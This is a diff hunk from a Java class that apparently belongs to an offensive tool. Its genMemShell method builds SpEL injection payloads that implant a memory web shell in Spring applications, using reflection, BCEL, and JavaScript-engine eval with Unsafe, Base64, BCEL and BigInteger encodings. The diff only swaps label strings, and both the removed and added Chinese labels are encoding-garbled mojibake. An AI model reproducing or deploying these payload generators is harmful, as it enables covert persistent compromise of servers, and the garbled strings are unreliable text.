@@ -63,16 +63,16 @@ public class SpELExpr implements IExpr {
     public String[] genMemShell(byte[] memShellClass) {
         try {
             return new String[]{
-                    "[+] Spring·´Éä×é¼þ·½°¸£º==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
-                    "[+] BCEL·½°¸£º==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
-                    "[+] JS-Unsafe·½°¸£º==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
-                    "[+] JS-BASE64·½°¸£º==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
-                    "[+] JS-BCEL·½°¸£º==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
-                    "[+] JS-BigInteger·½°¸£º==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
+                    "[+] Springåå°„ç»„ä»¶æ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell1(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] BCELæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out(SpELMemShellFactory.genSpringMemShell2(memShellClass)) + System.lineSeparator() + " <==",
+                    "[+] JS-Unsafeæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.UNSAFE).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
+                    "[+] JS-BASE64æ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BASE64).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
+                    "[+] JS-BCELæ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BCEL).replace("'", "''") + "')}") + System.lineSeparator() + " <==",
+                    "[+] JS-BigIntegeræ–¹æ¡ˆï¼š==>" + System.lineSeparator() + out("#{new javax.script.ScriptEngineManager().getEngineByName('js').eval('" + MemShellJSUtils.getMemShellPayload(memShellClass, MemShellClassFactory.BIGINTEGER).replace("'", "''") + "')}") + System.lineSeparator() + " <=="
             };
         } catch (Exception ex) {
             return new String[]{
-                    "classÎÄ¼þÒì³£",
+                    "classæ–‡ä»¶å¼‚å¸¸",
                     Utils.getErrDetail(ex)
             };
         }
